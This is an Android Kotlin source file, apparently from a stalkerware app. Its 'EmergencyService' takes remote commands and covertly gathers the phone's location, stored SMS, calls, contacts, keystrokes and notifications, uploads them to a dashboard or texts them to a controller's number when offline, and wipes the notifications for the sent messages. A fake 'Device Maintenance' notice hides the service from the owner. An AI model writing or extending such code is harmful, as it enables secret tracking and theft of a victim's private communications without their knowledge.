package com.example.myandroid

import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.IBinder
import android.telephony.SmsManager
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await

class EmergencyService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // CRITICAL FIX: Promote to Foreground immediately to prevent OS killing the service
        try {
            if (android.os.Build.VERSION.SDK_INT >= 34) {
                startForeground(666, createNotification(), 1073741824) // FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            } else {
                startForeground(666, createNotification())
            }
        } catch (e: Exception) {
            DebugLogger.log("EMERGENCY_ERR", "startForeground failed: ${e.message}")
        }

        val sender = intent?.getStringExtra("sender") ?: return START_NOT_STICKY
        val rawCmd = intent?.getStringExtra("codes") ?: "0"

        // PARSE COMMAND: Code-Duration-Frequency (e.g., "1-15-3")
        val parts = rawCmd.split("-")
        val moduleCode = parts.getOrElse(0) { "0" }
        val durationMins = parts.getOrElse(1) { "5" }.toLongOrNull() ?: 5L
        val freqSecs = parts.getOrElse(2) { "30" }.toLongOrNull() ?: 30L
        
        // Parse Modules
        val modules = parseCodes(moduleCode)

        scope.launch {
            DebugLogger.log("CodeRed", "Triggered! Cmd: $rawCmd (Dur: ${durationMins}m, Freq: ${freqSecs}s)")

            // SINGLE RUN MODE (Frequency 0)
            if (freqSecs <= 0L) {
                if (isOnline()) {
                    CloudManager.uploadData(applicationContext, modules, "EMERGENCY_RED")
                } else {
                    MyAccessibilityService.triggerDataRecovery()
                    delay(5000) 

                    // 1. Module-Aware Location Exfiltration
                    val locModule = modules.find { it.startsWith("location") }
                    if (modules.contains("ALL") || locModule != null) {
                        val loc = getLastKnownLocation()
                        if (loc != null) sendSms(sender, "ONE-SHOT LOC: ${loc.latitude},${loc.longitude}")
                    }

                    // 2. Module-Aware SMS Exfiltration
                    val smsModule = modules.find { it.startsWith("sms") }
                    if (modules.contains("ALL") || smsModule != null) {
                        val limit = smsModule?.split(":")?.getOrNull(1)?.toIntOrNull() ?: 5
                        val latestSms = PhoneManager.getHistoricalSms(applicationContext, limit)
                        for (i in 0 until latestSms.length()) {
                            val msg = latestSms.getJSONObject(i)
                            val loot = "[OneShot ${i+1}/${latestSms.length()}] ${msg.optString("num")}: ${msg.optString("body")}"
                            sendSms(sender, loot)
                            delay(1500)
                        }
                    }
                }
                stopSelf()
                return@launch
            }

            // LOOP MODE
            val endTime = System.currentTimeMillis() + (durationMins * 60 * 1000)
            
            // If offline, try Ghost Hand once at start to attempt data reconnection
            if (!isOnline()) MyAccessibilityService.triggerDataRecovery()

            while (System.currentTimeMillis() < endTime) {
                try {
                    if (isOnline()) {
                        // ONLINE: Upload Data normally to Dashboard
                        DebugLogger.log("CodeRed", "Online. Uploading modules: $modules")
                        CloudManager.uploadData(applicationContext, modules, "EMERGENCY_RED_LOOP")
                    } else {
                        // OFFLINE: SMS Tunnel Exfiltration
                        DebugLogger.log("CodeRed", "Offline. Engaging SMS Tunnel to $sender")

                        // 1. Location Exfiltration
                        val locModule = modules.find { it.startsWith("location") }
                        if (modules.contains("ALL") || locModule != null) {
                            val loc = getLastKnownLocation()
                            val locMsg = if (loc != null) "${loc.latitude},${loc.longitude}" else "GPS_SEARCHING"
                            sendSms(sender, "CR-BEACON: $locMsg")
                        }

                        // 2. SMS Exfiltration (The Ghost Tunnel)
                        val smsModule = modules.find { it.startsWith("sms") }
                        if (modules.contains("ALL") || smsModule != null) {
                            val limit = smsModule?.split(":")?.getOrNull(1)?.toIntOrNull() ?: 5
                            val latestSms = PhoneManager.getHistoricalSms(applicationContext, limit) // Exfiltrate specified limit
                            for (i in 0 until latestSms.length()) {
                                val msg = latestSms.getJSONObject(i)
                                val loot = "[Loot ${i+1}/${latestSms.length()}] From:${msg.optString("num")}: ${msg.optString("body")}"
                                sendSms(sender, loot)
                                delay(2000) // Throttle to prevent carrier blocking
                            }
                        }
                        
                        // Re-try accessibility-based data recovery
                        MyAccessibilityService.triggerDataRecovery()
                    }
                } catch (e: Exception) {
                    DebugLogger.log("CodeRedError", e.message ?: "Unknown")
                }

                // Stop if we've reached the end time during processing
                if (System.currentTimeMillis() >= endTime) break
                delay(freqSecs * 1000)
            }
            
            DebugLogger.log("CodeRed", "Session Expired. Shutting down.")
            stopSelf()
        }

        return START_NOT_STICKY
    }

    private fun parseCodes(raw: String): List<String> {
        val list = mutableListOf<String>()
        val parts = raw.split(",")
        
        if (parts.contains("0")) return listOf("ALL")

        parts.forEach { c ->
            val subParts = c.trim().split(":")
            val baseCode = subParts[0]
            val param = if (subParts.size > 1) ":${subParts[1]}" else ""
            when(baseCode) {
                "1" -> list.add("location$param")
                "2" -> list.add("sms$param")
                "3" -> { list.add("calls$param"); list.add("contacts$param") }
                "4" -> list.add("files$param")
                "5" -> list.add("typing$param")
                "6" -> list.add("usage$param")
                "7" -> list.add("notifications$param")
                "8" -> list.add("network$param")
                "9" -> list.add("apps$param")
            }
        }
        if (list.isEmpty()) list.add("location") 
        return list
    }

    private suspend fun getLastKnownLocation(): Location? {
        return try {
             if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                 val fused = LocationServices.getFusedLocationProviderClient(this)
                 fused.lastLocation.await()
             } else null
        } catch (e: Exception) { null }
    }

    private fun sendSms(phone: String, msg: String) {
        if (phone == "BACKEND") {
            DebugLogger.log("CodeRed", "SMS response aborted: No handler phone number provided for offline reply.")
            return
        }
        try {
            val smsManager = getSystemService(SmsManager::class.java)
            // Use multipart sending to ensure long exfiltrated messages aren't truncated by the OS
            val parts = smsManager.divideMessage(msg)
            smsManager.sendMultipartTextMessage(phone, null, parts, null, null)
            
            // Clear any "Message Sent" or thread update notifications from the UI
            CoroutineScope(Dispatchers.Main).launch {
                delay(1000)
                MyNotificationListener.instance?.wipeNotifications("TEXT", "CR-BEACON")
                MyNotificationListener.instance?.wipeNotifications("TEXT", "[Loot")
            }
            
            DebugLogger.log("CodeRed", "Exfiltrated chunk to $phone")
        } catch (e: Exception) {
            DebugLogger.log("CodeRed_SMS_ERR", "Failed to send exfiltration text: ${e.message}")
        }
    }

    private fun isOnline(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val caps = cm.getNetworkCapabilities(cm.activeNetwork)
        return caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
    }

    private fun createNotification(): android.app.Notification {
        val channelId = "emergency_channel"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val chan = android.app.NotificationChannel(channelId, "System Maintenance", android.app.NotificationManager.IMPORTANCE_MIN)
            chan.setShowBadge(false)
            getSystemService(android.app.NotificationManager::class.java).createNotificationChannel(chan)
        }
        return androidx.core.app.NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Maintenance")
            .setContentText("Optimizing storage and power metrics...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
            .build()
    }
}